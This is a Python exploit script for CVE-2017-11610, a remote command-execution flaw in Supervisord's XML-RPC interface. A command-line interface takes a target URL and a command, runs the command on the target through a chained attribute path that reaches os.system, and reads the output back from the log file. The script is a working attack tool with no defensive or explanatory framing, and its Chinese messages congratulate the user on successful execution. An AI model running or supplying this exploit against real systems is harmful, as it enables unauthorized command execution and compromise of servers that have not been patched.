#!/usr/bin/env python3
# coding=utf-8

import xmlrpc.client
import click

#命令执行
def exp(target, command):
    with xmlrpc.client.ServerProxy(target) as proxy:
        old = getattr(proxy, 'supervisor.readLog')(0,0)
        logfile = getattr(proxy, 'supervisor.supervisord.options.logfile.strip')()
        getattr(proxy, 'supervisor.supervisord.options.warnings.linecache.os.system')('{} | tee -a {}'.format(command, logfile))
        result = getattr(proxy, 'supervisor.readLog')(0,0)
    print("恭喜您执行成功，结果为:\n" + result[len(old):])

@click.command()
@click.option("--url", help='Target URL; Example:http://ip:port。', type=str)
@click.option("--cmd", help="Commands to be executed; ", type=str)
def main(url, cmd):
    ppp = '''
    ========================================================================================
    =   [+] CVE-2017-11610 Supervisord                                                     =
    =   [+] Explain: YaunSky   Time: 2020-12                                               =
    =   [+] python3 CVE-2017-11610.py --url http://127.0.0.1/ --cmd "command"              =
    =====================================================================-==================
'''
    print(ppp)
    target = str(url) + "RPC2"
    exp(target, cmd)

if __name__ == "__main__":
    main()